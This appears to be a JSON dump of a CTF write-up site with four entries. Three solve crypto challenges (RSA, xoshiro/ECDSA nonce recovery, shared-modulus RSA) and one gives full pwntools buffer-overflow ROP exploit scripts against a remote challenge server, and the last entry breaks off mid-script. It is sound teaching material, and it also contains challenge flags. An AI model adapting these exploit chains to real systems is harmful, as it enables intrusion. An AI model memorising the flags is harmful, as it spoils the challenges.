[{"id":0,"href":"/docs/writeups/l3akctf/basiclll/","title":"BasicLLL","section":"L3ak Ctf","content":"Challenge: Simple crypto is the best crypto.\nFor this crypto chall we have to download 1 file. A sage one.\ndef generate(): p = random_prime(2^1024, lbound=2^1023) x=randint(1,2^16) y=randint(1,2^256) a=randint(2^1023,2^1024) q=random_prime(2^1024) n=p*q return x,a,y,n,p x,a,y,n,p = generate() k = x * y + a * p e=65537 print(f\u0026#34;x = {x}\u0026#34;) print(f\u0026#34;a = {a}\u0026#34;) print(f\u0026#34;n = {n}\u0026#34;) print(f\u0026#34;k = {k}\u0026#34;) m = b\u0026#39;L3AK{\u0026lt;Redacted\u0026gt;}\u0026#39; flag = int.from_bytes(m, byteorder=\u0026#39;big\u0026#39;) c= pow(flag, e, n) print(f\u0026#34;c = {c}\u0026#34;) \u0026#39;\u0026#39;\u0026#39; x = 54203 a = 139534605978199350449870348663594126359773246906906418074945064315708552206952695156472923968554408862426942537522569163756593332601739006413404986641247624386522169136633429464195370373009454673819688653512479919153332504769835621608305089536245284458011218876474599059184828911301976396971466368457267831713 n = 12909957208634846878337953184362917609451224905637563117148705894888627434882610771803126452504238664471840340722310690445704139825753660053450331966698205860077330083433391290469454571152366284661640391190008258576947840075212180965738595761925516686689797153224716140447515370184846067654512660266993573880775530634588475842083212670090415716860925772115834314563453955681012820960922892736520042799257599331942717963921797157341454739255402633419216921702659541513141028779948257696746810146033667942181244847983610429227387863821351416689099862418820999250005071861968501333899759899513283613946626413863922604073 k = 24474689179117620559916890529357882261493825442019850679598519081287156822984032786458479363048845076078220151760752906879055457682971398809768604333650029141164831566127754715775782823279839766009120238777348170982471623193652714921064243946655726118484337862412275391615166714375745390409664610412156281691721978732319253694004232933156865189917761521085635692596755802274763409871937618659197646864593743015558828475450200247766980008744319676783526158213931581034209356092026748307730083927225249093712227456855972520574747646873074625455900058136458828591335711677741591552501530047335481073272381631524755666119 c = 11185314040721202177044508537272244264288033276739579716599246665772965854249656943282002695659011960313245796587834222078633141747802754149848079632693280265262199729548775879612614113828267471629389698999657686858047585254549801752634049341009476489652456620836030696102393122618822021082792763848220677651608135328630551380537642144416978955966827336280510774254681264136102268730343853559751471313539810499170669215479225898738527316798768622089152851154959800113070358637984124299357803777453137311143202502153552192970732744885328421213081964363890280109214401691255867427694709196120824176729643585687319321473 \u0026#39;\u0026#39;\u0026#39; With just a simple look we can see that this is RSA. So once we are aware of that, we know that in order to decipher RSA we need d, the private key. If you don\u0026rsquo;t understand or are not very familiar with RSA I would suggest checking this: https://www.geeksforgeeks.org/computer-networks/rsa-algorithm-cryptography/ , that will give you a brief summary in order to understand the following equations.\nOne of the ways to compute d in python is the following:\nd = pow(e, -1, phiN) But we dont have phiN, and for phiN we also need p and q. So how do we address this challenge?\nWe need to solve k = xy + ap. With some math we can reorder this so that we can calculate it with the variables we have. k = xy + ap\nk - xy = ap\nk - xy ≡ 0 (mod a) (Modular congruence property)\ny = k/x (mod a)\ny = x⁻1 k (mod a)\nWe can calculate this in python as:\ny = pow(x⁻1, k, a) For some more clarity this: x = pow(4, 3, 5) means: (4x4x4)%5\nSo the script to solve the challenge would be the following:\nfrom Crypto.Util.number import * x = 54203 a = 139534605978199350449870348663594126359773246906906418074945064315708552206952695156472923968554408862426942537522569163756593332601739006413404986641247624386522169136633429464195370373009454673819688653512479919153332504769835621608305089536245284458011218876474599059184828911301976396971466368457267831713 n = 12909957208634846878337953184362917609451224905637563117148705894888627434882610771803126452504238664471840340722310690445704139825753660053450331966698205860077330083433391290469454571152366284661640391190008258576947840075212180965738595761925516686689797153224716140447515370184846067654512660266993573880775530634588475842083212670090415716860925772115834314563453955681012820960922892736520042799257599331942717963921797157341454739255402633419216921702659541513141028779948257696746810146033667942181244847983610429227387863821351416689099862418820999250005071861968501333899759899513283613946626413863922604073 k = 24474689179117620559916890529357882261493825442019850679598519081287156822984032786458479363048845076078220151760752906879055457682971398809768604333650029141164831566127754715775782823279839766009120238777348170982471623193652714921064243946655726118484337862412275391615166714375745390409664610412156281691721978732319253694004232933156865189917761521085635692596755802274763409871937618659197646864593743015558828475450200247766980008744319676783526158213931581034209356092026748307730083927225249093712227456855972520574747646873074625455900058136458828591335711677741591552501530047335481073272381631524755666119 c = 11185314040721202177044508537272244264288033276739579716599246665772965854249656943282002695659011960313245796587834222078633141747802754149848079632693280265262199729548775879612614113828267471629389698999657686858047585254549801752634049341009476489652456620836030696102393122618822021082792763848220677651608135328630551380537642144416978955966827336280510774254681264136102268730343853559751471313539810499170669215479225898738527316798768622089152851154959800113070358637984124299357803777453137311143202502153552192970732744885328421213081964363890280109214401691255867427694709196120824176729643585687319321473 e=65537 # k = x*y + a*p # k - x*y = a*p # k - x*y =_ 0 (mod a) # y =_ (x⁻1)*k (mod a) x_inv = pow(x, -1, a) y = (x_inv * k) % a p = (k-(x*y))//a q = n//p phiN = (p-1)*(q-1) d = pow(e, -1, phiN) m = long_to_bytes(pow(c,d,n)) print(m.decode()) L3AK{u_4ctu4lly_pwn3d_LLL_w1th_sh0rt_v3ct0rs_n1c3}\n"},{"id":1,"href":"/docs/writeups/l3akctf/shirohero/","title":"Shiro Hero","section":"L3ak Ctf","content":"Challenge:\nFor this crypto chall we have to download 4 files, 3 of them are python scripts and the last one is just a text file.\nChall.py\nfrom secrets import randbits from prng import xorshiro256 from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from ecc import ECDSA from Crypto.Util.number import bytes_to_long, long_to_bytes import hashlib flag = open(\u0026#34;flag.txt\u0026#34;, \u0026#34;rb\u0026#34;).read() state = [randbits(64) for _ in range(4)] prng = xorshiro256(state) leaks = [prng.next_raw() for _ in range(4)] print(f\u0026#34;PRNG leaks: {[hex(x) for x in leaks]}\u0026#34;) Apriv, Apub = ECDSA.gen_keypair() print(f\u0026#34;public_key = {Apub}\u0026#34;) msg = b\u0026#34;My favorite number is 0x69. I\u0026#39;m a hero in your mother\u0026#39;s bedroom, I\u0026#39;m a hero in your father\u0026#39;s eyes. What am I?\u0026#34; H = bytes_to_long(msg) sig = ECDSA.ecdsa_sign(H, Apriv, prng) print(f\u0026#34;Message = {msg}\u0026#34;) print(f\u0026#34;Hash = {H}\u0026#34;) print(f\u0026#34;r, s = {sig}\u0026#34;) key = hashlib.sha256(long_to_bytes(Apriv)).digest() iv = randbits(128).to_bytes(16, \u0026#34;big\u0026#34;) cipher = AES.new(key, AES.MODE_CBC, iv) ciphertext = iv.hex() + cipher.encrypt(pad(flag, 16)).hex() print(f\u0026#34;ciphertext = {ciphertext}\u0026#34;) with open(\u0026#34;output.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(f\u0026#34;PRNG leaks: {[hex(x) for x in leaks]}\\n\u0026#34;) f.write(f\u0026#34;public_key = {Apub}\\n\u0026#34;) f.write(f\u0026#34;Message = {msg}\\n\u0026#34;) f.write(f\u0026#34;Hash = {H}\\n\u0026#34;) f.write(f\u0026#34;r, s = {sig}\\n\u0026#34;) f.write(f\u0026#34;ciphertext = {ciphertext}\\n\u0026#34;) ecc.py\n#!/usr/bin/env python3 import random from hashlib import sha3_256, sha256 from Crypto.Util.number import bytes_to_long, inverse from Crypto.Cipher import AES from Crypto.Util.Padding import unpad, pad from prng import xorshiro256, MASK64 import hashlib import os class ECDSA: \u0026#34;\u0026#34;\u0026#34;ECDSA implementation for secp256k1 curve\u0026#34;\u0026#34;\u0026#34; # parameters p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F a = 0 b = 7 Gx = 55066263022277343669578718895168534326250603453777594175500187360389116729240 Gy = 32670510020758816978083085130507043184471273380659243275938904335757337482424 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 G = (Gx, Gy) @staticmethod def digest(msg: bytes) -\u0026gt; int: \u0026#34;\u0026#34;\u0026#34;Hash a message and return as integer\u0026#34;\u0026#34;\u0026#34; return bytes_to_long(sha256(msg).digest()) @staticmethod def point_add(P, Q): \u0026#34;\u0026#34;\u0026#34;Add two points on the elliptic curve\u0026#34;\u0026#34;\u0026#34; if P == (None, None): return Q if Q == (None, None): return P (x1, y1), (x2, y2) = P, Q if x1 == x2 and (y1 + y2) % ECDSA.p == 0: return (None, None) if P == Q: l = (3 * x1 * x1) * inverse(2 * y1, ECDSA.p) % ECDSA.p else: l = (y2 - y1) * inverse(x2 - x1, ECDSA.p) % ECDSA.p x3 = (l * l - x1 - x2) % ECDSA.p y3 = (l * (x1 - x3) - y1) % ECDSA.p return (x3, y3) @staticmethod def scalar_mult(k, P): R = (None, None) while k: if k \u0026amp; 1: R = ECDSA.point_add(R, P) P = ECDSA.point_add(P, P) k \u0026gt;\u0026gt;= 1 return R @staticmethod def gen_keypair(): d = random.randint(1, ECDSA.n - 1) Q = ECDSA.scalar_mult(d, ECDSA.G) return d, Q @staticmethod def ecdsa_sign(h: int, d: int, prng: xorshiro256): while True: k = prng() % ECDSA.n if not k: continue x, _ = ECDSA.scalar_mult(k, ECDSA.G) if x is None: continue r = x % ECDSA.n if not r: continue s = (inverse(k, ECDSA.n) * (h + r * d)) % ECDSA.n if s: return r, s @staticmethod def ecdsa_verify(h, Q, sig): r, s = sig if not (1 \u0026lt;= r \u0026lt; ECDSA.n and 1 \u0026lt;= s \u0026lt; ECDSA.n): return False w = inverse(s, ECDSA.n) u1 = (h * w) % ECDSA.n u2 = (r * w) % ECDSA.n x, _ = ECDSA.point_add(ECDSA.scalar_mult(u1, ECDSA.G), ECDSA.scalar_mult(u2, Q)) if x is None: return False return (x % ECDSA.n) == r prng.py\n#!/usr/bin/python3 from Crypto.Util.number import bytes_to_long, inverse MASK64 = (1 \u0026lt;\u0026lt; 64) - 1 def _rotl(x: int, k: int) -\u0026gt; int: return ((x \u0026lt;\u0026lt; k) | (x \u0026gt;\u0026gt; (64 - k))) \u0026amp; MASK64 class xorshiro256: def __init__(self, seed): if len(seed) != 4: raise ValueError(\u0026#34;seed must have four 64-bit words\u0026#34;) self.s = [w \u0026amp; MASK64 for w in seed] @staticmethod def _temper(s1: int) -\u0026gt; int: return (_rotl((s1 * 5) \u0026amp; MASK64, 7) * 9) \u0026amp; MASK64 def next_raw(self) -\u0026gt; int: s0, s1, s2, s3 = self.s t = (s1 \u0026lt;\u0026lt; 17) \u0026amp; MASK64 s2 ^= s0 s3 ^= s1 s1 ^= s2 s0 ^= s3 s2 ^= t s3 = _rotl(s3, 45) self.s = [s0, s1, s2, s3] return s1 def randrange(self, start, stop, inclusive=False): if inclusive: return start + self.next_raw() % (stop - start + 1) return start + self.next_raw() % (stop - start) def __call__(self) -\u0026gt; int: return self._temper(self.next_raw()) outuput.txt\nPRNG leaks: [\u0026#39;0x785a1cb672480875\u0026#39;, \u0026#39;0x91c1748fec1dd008\u0026#39;, \u0026#39;0x5c52ec3a5931f942\u0026#39;, \u0026#39;0xac4a414750cd93d7\u0026#39;] public_key = (108364470534029284279984867862312730656321584938782311710100671041229823956830, 13364418211739203431596186134046538294475878411857932896543303792197679964862) Message = b\u0026#34;My favorite number is 0x69. I\u0026#39;m a hero in your mother\u0026#39;s bedroom, I\u0026#39;m a hero in your father\u0026#39;s eyes. What am I?\u0026#34; Hash = 9529442011748664341738996529750340456157809966093480864347661556347262857832209689182090159309916943522134394915152900655982067042469766622239675961581701969877932734729317939525310618663767439074719450934795911313281256406574646718593855471365539861693353445695 r, s = (54809455810753652852551513610089439557885757561953942958061085530360106094036, 42603888460883531054964904523904896098962762092412438324944171394799397690539) ciphertext = 404e9a7bbdac8d3912d881914ab2bdb924d85338fbd1a6d62a88d793b4b9438400489766e8e9fb157c961075ad4421fc First of all the main file is chall.py, since it has all the algorithms to solve. The structure is the following, diferent ciphers that we need to solve in order to continue. We also have access to ecc.py and prng.py that show us the implementation for some functions, as well to some more data with output.txt.\nKnowing all this, lets start.\nHere 4 64 bits random numbers are generated and they are assigned to the state of a cipher called xorshiro256.\nstate = [randbits(64) for _ in range(4)] prng = xorshiro256(state) In xorshiro this 4 numbers (state) are defined as s0, s1, s2, s3. Here the \u0026ldquo;leaks\u0026rdquo; (in the output.txt) that are printed are not the s0,s1\u0026hellip; numbers. We are just seeing s1 being updated 4 times due to the next_raw() function.\nleaks = [prng.next_raw() for _ in range(4)] print(f\u0026#34;PRNG leaks: {[hex(x) for x in leaks]}\u0026#34;) def next_raw(self) -\u0026gt; int: s0, s1, s2, s3 = self.s t = (s1 \u0026lt;\u0026lt; 17) \u0026amp; MASK64 s2 ^= s0 s3 ^= s1 s1 ^= s2 s0 ^= s3 s2 ^= t s3 = _rotl(s3, 45) self.s = [s0, s1, s2, s3] return s1 AS you can see above the whole state (s0,s1,s2,3) is changed but we only see the s1.\nUnderstanding this part is important because we are going to need to recover the 4 original numbers in order to continue. So again, prng is updated in 4 rounds with next_raw() and we have access to the value of s1 in each round.\nFor solving this I used a very useful tool called z3, I wont go into too much detail explaining the following script but we are basically forcing z3 to find the 4 original 64 bits numbers by reversing the leaks.\nfrom z3 import * MASK64 = (1 \u0026lt;\u0026lt; 64) - 1 def rotl(x, k): return RotateLeft(x, k) leaks = [ 0x785a1cb672480875, 0x91c1748fec1dd008, 0x5c52ec3a5931f942, 0xac4a414750cd93d7 ] s0 = BitVec(\u0026#39;s0\u0026#39;, 64) s1 = BitVec(\u0026#39;s1\u0026#39;, 64) s2 = BitVec(\u0026#39;s2\u0026#39;, 64) s3 = BitVec(\u0026#39;s3\u0026#39;, 64) def next_raw_z3(s0, s1, s2, s3): t = (s1 \u0026lt;\u0026lt; 17) \u0026amp; MASK64 s2_new = s2 ^ s0 s3_new = s3 ^ s1 s1_new = s1 ^ s2_new s0_new = s0 ^ s3_new s2_new = s2_new ^ t s3_new = rotl(s3_new, 45) return s0_new, s1_new, s2_new, s3_new, s1_new solver = Solver() state = [s0, s1, s2, s3] for i in range(4): state[0], state[1], state[2], state[3], out = next_raw_z3(*state) solver.add(out == BitVecVal(leaks[i], 64)) if solver.check() == sat: model = solver.model() recovered_state = [model.eval(s).as_long() for s in [s0, s1, s2, s3]] print(\u0026#34;Estado recuperado:\u0026#34;, recovered_state) We run the script and here they are. [4632343889369999961, 10793220881798324403, 12527397580889080479, 11809022490152434257]\nNow we run into another type of cipher, an ECDSA sign.\nApriv, Apub = ECDSA.gen_keypair() print(f\u0026#34;public_key = {Apub}\u0026#34;) msg = b\u0026#34;My favorite number is 0x69. I\u0026#39;m a hero in your mother\u0026#39;s bedroom, I\u0026#39;m a hero in your father\u0026#39;s eyes. What am I?\u0026#34; H = bytes_to_long(msg) sig = ECDSA.ecdsa_sign(H, Apriv, prng) As we can see in the prng.py, k, the nounce, is calculated with prng(). But this call, prng(), is done after the 4 rounds of next_raw() of the leaks.\ndef ecdsa_sign(h: int, d: int, prng: xorshiro256): while True: k = prng() % ECDSA.n if not k: continue x, _ = ECDSA.scalar_mult(k, ECDSA.G) if x is None: continue r = x % ECDSA.n if not r: continue s = (inverse(k, ECDSA.n) * (h + r * d)) % ECDSA.n if s: return r, s We have the original state, so we call next_raw() 4 times and prng() once.\nBefore doing this lets take a look to the ECSA signing function. With some maths we can reorder this and since we have everything either in output.txt or ecc.py we can just calculate k and continue. s ≡ (k^⁻1)((H+r) d) (mod n) \u0026ndash;\u0026gt; d ≡(s k-H) r^-1 (mod n)\nfrom prng import xorshiro256 state = [4632343889369999961, 10793220881798324403, 12527397580889080479, 11809022490152434257] prng = xorshiro256(state) prng.next_raw() prng.next_raw() prng.next_raw() prng.next_raw() semi_K = prng() n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 k = semi_K % n Hash = 9529442011748664341738996529750340456157809966093480864347661556347262857832209689182090159309916943522134394915152900655982067042469766622239675961581701969877932734729317939525310618663767439074719450934795911313281256406574646718593855471365539861693353445695 r = 54809455810753652852551513610089439557885757561953942958061085530360106094036 s = 42603888460883531054964904523904896098962762092412438324944171394799397690539 r_inv = pow(r, -1, n) d = ((s*k-Hash)*r_inv) % n print(d) d: 100589891343820979015464582911071111464252983749550820544942776016668758604656\nThe next and final step is an AES CBC cipher. To have the key we just need to apply the same hash function to d. Whereas iv is concatenated to the cipher: ciphertext = 16bits of the iv + cipher. So we just need to divide them.\nkey = hashlib.sha256(long_to_bytes(Apriv)).digest() iv = randbits(128).to_bytes(16, \u0026#34;big\u0026#34;) cipher = AES.new(key, AES.MODE_CBC, iv) ciphertext = iv.hex() + cipher.encrypt(pad(flag, 16)).hex() And here the script:\nd = 100589891343820979015464582911071111464252983749550820544942776016668758604656 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad from Crypto.Util.number import long_to_bytes import hashlib ciphertext_hex = \u0026#34;404e9a7bbdac8d3912d881914ab2bdb924d85338fbd1a6d62a88d793b4b9438400489766e8e9fb157c961075ad4421fc\u0026#34; key = hashlib.sha256(long_to_bytes(d)).digest() ciphertext_bytes = bytes.fromhex(ciphertext_hex) iv = ciphertext_bytes[:16] ciphertext_data = ciphertext_bytes[16:] cipher = AES.new(key, AES.MODE_CBC, iv) flag = unpad(cipher.decrypt(ciphertext_data), 16) print(\u0026#34;FLAG:\u0026#34;, flag.decode()) FLAG: L3AK{u_4r3_th3_sh1r0_h3r0!}\n"},{"id":2,"href":"/docs/writeups/dawgctf/64-bits/","title":"64 bits in my ark and texture","section":"Dawg Ctf","content":"Challenge: 64 bits in my Ark and Texture (300 points) Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation. nc connect.umbccd.net 22237\nAlongside this, we are provided with a binary file. When we execute the file 3 basic questions about x86-64 appear. Once we answer the first three questions (2, 1, 4), the first part of the real challenge is proposed:\nThey ask us to simply jump to a memory address, if we run this binary with ghidra or binaryNinja (tools for analyzing compiled software) wen can see the first vulnerability.\nAt the end of the main function we can see that is using fgets() to read the user input. The problem is that is reading 0x200 bytes (0x200 in hexadecimal = 512 bytes) and storing it in a variable buf. But since buf is defined as int64_t it means it can only store 8 bytes.\nFor later use keep in mind that the names of the functions we are going to use are: -main -win1 -win2 -win3 All of these can be seen when the binary is run with gdb, ghidra\u0026hellip; They will make our life easier since we will not have to deal with little/big endian.\nThis leads us to a buffer overflow vulnerability, since we can input more bytes than the variable is able to deal with, we can overwrite memory addresses. For us to make a call to another function we need to understand some basic things.\nOnce a function finishes it knows where to jump thanks to the return pointer (rsp), that stores the address of the next function. That is to say that we need to find where the rsp is and overwrite the address with the one we want.\nSo the first thing we need to know is how much data weneed to input before overwriting this pointer. For this I\u0026rsquo;m goint to be using gdb with pwn.\nFirst we run in our terminal gdb ./chall, when we are alredy inside of pwndgb we can enter the command run and answer the questions. Once we answer them we have to make a little script with python that will allow as to know the number of character we need to introduce.\nThese 3 lines of code allow us to create a pattern, of length 200. Once we have that we print it and copy it to out clipboard.\nfrom pwn import * pattern = cyclic(200) print(pattern.decode()) This will print something like: aabbacabwbbbcawewca\u0026hellip; Which might seem random letters but they do have a specific order.\nNow we enter this pattern and see that the program failed, we accessed something that we shouldn\u0026rsquo;t in the memory and it broke. But if we scroll down a little bit we can see some interesting report that pwndgb shows to us.\nWe can see the value of rsp with some letters that seem familiar, part of the pattern we introduced.\nNow that we have this we can run another command with python. This will tell us the number of letters we need to reach this part of the pattern. So if this prints 30 it means that we could inject 30 random letters and then after that we would be overwriting the rsp.\nprint(cyclic_find(\u0026#34;naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\\n\u0026#34;)) And this prints 152, meaning that after 152 characters we can point to wherever we want and the program will jump there.\nWe are going to use another python file to complete this task.\nfrom pwn import * # Load the binary as an ELF object. We set checksec to False # to skip security checks if we already know the result # (you can check manually with: checksec --file=./chall) elf = ELF(\u0026#34;./chall\u0026#34;, checksec=False) # It\u0026#39;s good practice to define the context so pwntools knows # we are working with a 64-bit x86 binary context.binary = elf # Open the remote connection p = remote(\u0026#34;connect.umbccd.net\u0026#34;, 22237) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) # Send the correct answers to the initial quiz questions p.sendline(\u0026#34;2\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) p.sendline(\u0026#34;1\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) p.sendline(\u0026#34;4\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) # ------- PAYLOAD 1 ---------- # Create a ROP (Return Oriented Programming) object to # build the payload. # The payload is constructed locally using the ELF binary # and then sent to the remote process. (Remember the statement) rop = ROP(elf) # Fill the buffer with 152 characters, stopping right # before the return address rop.raw(b\u0026#39;A\u0026#39; * 152) # Insert a \u0026#39;ret\u0026#39; gadget to align the stack (this ensures # the stack is 16-byte aligned before a function call). # This is sometimes required on x86-64 systems to avoid # crashes or undefined behavior. rop.raw(p64(rop.find_gadget([\u0026#39;ret\u0026#39;]).address)) rop.call(\u0026#39;win1\u0026#39;) p.sendline(rop.chain()) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) With this we can achieve what we wanted but is not enough now they ask us to do the following.\nYou have passed the first challenge. The next one won\u0026rsquo;t be so simple. Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.DawgCTF{C0ngR4tul4t10ns_ Continue:\nWe need to call another function but in this case with an argument. Now we need to understand how to call a function in this case. Here comes to play the title of the challenge (64-bits).\nLet\u0026rsquo;s look at the image below, above the return pointer there are arguments from 7 to n and below the pointer, the registers. When a function is called in 32 bit architecture all the arguments are passed directly to the stack.\nBut in this case we are working in a 64 bits architecture and when calling a function the first 6 parameters are stored in different registers. That\u0026rsquo;s why in the image the arguments start from the 7th.\nNow that we know this we can take a look at which are the registers that are used for the arguments. Since we are only going to need 1 argument we will use the first one, rdi.\nBefore rewriting the script we need to understand this, once the first bufferoverflow is done calling win1 we can then concatenate the next payload. There is no need to make another bufferoverflow and run them separately, since we are alredy stacking them in the stack.\nfrom pwn import * # Load the binary as an ELF object. We set checksec to False to skip security checks # if we already know the result (you can check manually in the terminal # with: checksec --file=./chall) elf = ELF(\u0026#34;./chall\u0026#34;, checksec=False) # It\u0026#39;s good practice to define the context so pwntools knows we are working with a 64-bit x86 binary context.binary = elf # Open the remote connection p = remote(\u0026#34;connect.umbccd.net\u0026#34;, 22237) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) # Send the correct answers to the initial quiz questions p.sendline(\u0026#34;2\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) p.sendline(\u0026#34;1\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) p.sendline(\u0026#34;4\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) # ------- PAYLOAD 1 ---------- # Create a ROP (Return Oriented Programming) object to build the payload. # The payload is constructed locally using the ELF binary and then sent to the remote process. rop = ROP(elf) # Fill the buffer with 152 characters, stopping right before the return address rop.raw(b\u0026#39;A\u0026#39; * 152) # Insert a \u0026#39;ret\u0026#39; gadget to align the stack (this ensures the stack is 16-byte aligned before a function call) # This is sometimes required on x86-64 systems to avoid crashes or undefined behavior. rop.raw(p64(rop.find_gadget([\u0026#39;ret\u0026#39;]).address)) rop.call(\u0026#39;win1\u0026#39;) # ------- PAYLOAD 2 ---------- # Similar approach, but now we add the first function argument in the rdi register rop.rdi = 0xdeadbeef rop.raw(p64(rop.find_gadget([\u0026#39;ret\u0026#39;]).address)) rop.call(\u0026#34;win2\u0026#34;) p.sendline(rop.chain()) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) p.sendline(\u0026#34;A\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) Now we are presented with the last challenge. You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you d15c1p13_y0u_ Final Test:\nThis is no different than the previous one, we just need to concatenate the 3 payloads and this is the final script. And like we saw in a photo earlier we need the 3 register that pass the first 3 arguments, rdi, rsi and rdx.\nfrom pwn import * # Load the binary as an ELF object. We set checksec # to False to skip security checks if we already know # the result (you can check manually with: checksec --file=./chall) elf = ELF(\u0026#34;./chall\u0026#34;, checksec=False) # It\u0026#39;s good practice to define the context so pwntools # knows we are working with a 64-bit x86 binary context.binary = elf # Open the remote connection p = remote(\u0026#34;connect.umbccd.net\u0026#34;, 22237) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) # Send the correct answers to the initial quiz questions p.sendline(\u0026#34;2\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) p.sendline(\u0026#34;1\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) p.sendline(\u0026#34;4\u0026#34;) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) print(p.recv().decode(\u0026#34;utf-8\u0026#34;)) #All three payloads will be executed in a row. This means # we don’t need to perform three separate buffer overflows. # After the first overflow, we can place all return addresses # on the stack, and they will be executed sequentially.That\u0026#39;s # why we build everything together and send it in a single rop.chain() call. # ------- PAYLOAD 1 ---------- # Create a ROP (Return Oriented Programming) object to build # the payload. The payload is constructed locally using the # ELF binary and then sent to the remote process. rop = ROP(elf) # Fill the buffer with 152 characters, stopping right # before the return address. rop.raw(b\u0026#39;A\u0026#39; * 152) # Insert a \u0026#39;ret\u0026#39; gadget to align the stack (this ensures # the stack is 16-byte aligned before a function call). # This is sometimes required on x86-64 systems to avoid # crashes or undefined behavior. rop.raw(p64(rop.find_gadget([\u0026#39;ret\u0026#39;]).address)) rop.call(\u0026#39;win1\u0026#39;) # ------- PAYLOAD 2 ---------- # Similar approach, but now we add the first function # argument in the rdi register rop.rdi = 0xdeadbeef rop.raw(p64(rop.find_gadget([\u0026#39;ret\u0026#39;]).address)) rop.call(\u0026#34;win2\u0026#34;) # ------- PAYLOAD 3 ---------- # Now we add values for rdi, rsi, and rdx registers # for a function that expects three arguments rop.rdi = 0xdeadbeef rop.rsi = 0xdeafface rop.rdx = 0xfeedcafe rop.raw(p64(rop.find_gadget([\u0026#39;ret\u0026#39;]).address)) rop.call(\u0026#34;win3\u0026#34;) rop.call(\u0026#34;exit\u0026#34;) # Graceful exit after payload # Send the full payload chain p.sendline(rop.chain()) # Handle any final prompts and interaction print(p.recvuntil(\u0026#34;Continue:\u0026#34;).decode(\u0026#34;utf-8\u0026#34;)) p.sendline(\u0026#34;A\u0026#34;) print(p.recvuntil(\u0026#34;Test:\u0026#34;).decode(\u0026#34;utf-8\u0026#34;)) p.sendline(\u0026#34;A\u0026#34;) print(p.recvall().decode(\u0026#34;utf-8\u0026#34;)) Congratulations. You are deserving of you reward 4r3_r34dy_2_pwn!}\n"},{"id":3,"href":"/docs/writeups/dawgctf/baby-rsa2/","title":"Baby-RSA 2","section":"Dawg Ctf","content":"Challenge: If all I have to do is keep my factors p and q secret, then I can save computation time by sharing the same modulus between all my friends. I\u0026rsquo;ll give them unique e and d pairs to encrypt and decrypt messages. Sounds secure to me!\nFor this we are given 2 files. The first one is a .py and the second one what prints.\nfrom Crypto.Util.number import * from secret import flag # This is my stuff! Don\u0026#39;t look at it p = getPrime(512) q = getPrime(512) N = p * q e_priv = 0x10001 phi = (p - 1) * (q - 1) d_priv = inverse(e_priv, phi) m = bytes_to_long(flag) c = pow(m, e_priv, N) # This is your stuff! e_pub = getPrime(16) d_pub = inverse(e_pub, phi) print(f\u0026#34;e = {e_pub}\u0026#34;) print(f\u0026#34;d = {d_pub}\u0026#34;) print(f\u0026#34;N = {N}\u0026#34;) print(f\u0026#34;c = {c}\u0026#34;) e = 58271 d = 16314065939355844497428646964774413938010062495984944007868244761330321449198604198404787327825341236658059256072790190934480082681534717838850610633320375625893501985237981407305284860652632590435055933317638416556532857376955427517397962124909869006289022084571993305966362498048396739334756594170449299859 N = 11908266771291549727040770227788674365298563844463718805993868100807705889593534576540716051355511201319075171121352338919492532856516466781757032847478539199285763483256 2389502866385475392702847788337877472422435555825872297998602400341624700149407637506713864175123267515579305109471947679940924817268027249 c = 1070895821540922853545147589874651120161444554801263669629104142937219656827406742051002228234391509902999896805931793509330204277323867163866850522216802742834694813501 06415150660410528574034324184318354089504379956162660478769613136499331243363223860893663583161020156316072996007464894397755058410931262938\nFor this challenge we are requiered to know RSA cryptography and how their public and private keys work.\nA cypher message with RSA is calculated like this, ciphertext = m^e mod n. Where m is the plain message, e is the public exponent and n is the product of two large numbers p and q.\nTo return to the plain text we have to decrypt it like this m =c^d mod n, where d is the private key. d is computed like this d×e ≡ 1 (mod φ(N)). Where φ(N) = (p-1)*(q-1).\nAs we said e×d ≡ 1 (mod φ(N)) and we can rearrange it like this: e×d − 1 = k × φ(N) for some small integer k. So we need to find a number k that matches (e×d − 1) % k == 0.\nWe can use this python script that will try different numbers.\nfrom Crypto.Util.number import * e_public = 58271 d_public = 16314065939355844497428646964774413938010062495984944007868244761330321449198604198404787327825341236658059256072790190934480082681534717838850610633320375625893501985237981407305284860652632590435055933317638416556532857376955427517397962124909869006289022084571993305966362498048396739334756594170449299859 N = 